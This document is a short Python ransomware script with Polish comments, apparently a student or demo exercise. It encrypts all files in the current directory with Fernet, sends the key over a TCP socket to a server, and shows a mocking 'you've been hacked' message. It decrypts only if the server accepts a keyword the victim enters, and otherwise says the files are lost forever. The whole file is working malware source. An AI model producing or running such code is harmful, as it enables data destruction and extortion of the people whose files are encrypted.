#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import socket

# Zmienne potrzebne od ustanowienia połączenia z serwerem.
HOST = socket.gethostbyname(socket.gethostname()) # Wyslij na loopback.
PORT = 40445  # Wybrany losowo
BUFFER_SIZE = 4096
BYTEORDER_LENGTH = 8 # We don't need big buffer size to send size of file
FORMAT = "utf-8"

# Nawiąż połączenie z serwerem.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))


def main():
    files = []

    # Znajdź wszystkie pliki i wrzuć do listy poza pewnymi wyjątkami.
    for file in os.listdir():
            if (file == "coding.py") or (file == "crypto_key.key") or (file == "decoding.py") or (file == "instrukcja.txt"):
              continue
            if os.path.isfile(file):
              files.append(file)

    # Wygeneruj klucz i zaszyfruj nim pliki.
    key = Fernet.generate_key()

    for file in files:
        with open(file, "rb") as crypto_file:
            contents = crypto_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as crypto_file:
            crypto_file.write(contents_encrypted)
    
    

    # (1) Wyślij klucz do serwera
    s.send(key)

    # Poproś o słowo klucz.
    print("[i] Zostales shakowany. Ha HA ha! Jestesmy na tyle mili, ze jak podasz slowo klucz, to odszyfrujemy Twoje pliki.")
    user_phase = str(input("Podaj slowo klucz: "))

    # (2) Wyślij słowo klucz do serwera.
    s.send(user_phase.encode(FORMAT))

    # (3) Odbierz odpowiedz od serwera dotyczaca slowa klucz.
    res = s.recv(BUFFER_SIZE).decode(FORMAT)
    
    if(res == 'ACK'):
        # (4) Odbierz klucz od serwera.
        print("[+] Podano prawidłowe słowo klucz, trwa odszyfrowywanie plików...")
        key = s.recv(BUFFER_SIZE)

        # Odszyfruj pliki.
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(key).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        print("[+] Pliki odszyfrowane. Nastepnym razem uwazaj!")
    
    else:
        print("[-] Podano złe słowo klucz, już nigdy nie odszyfrujesz tych plików!")
    
    s.close()

main()

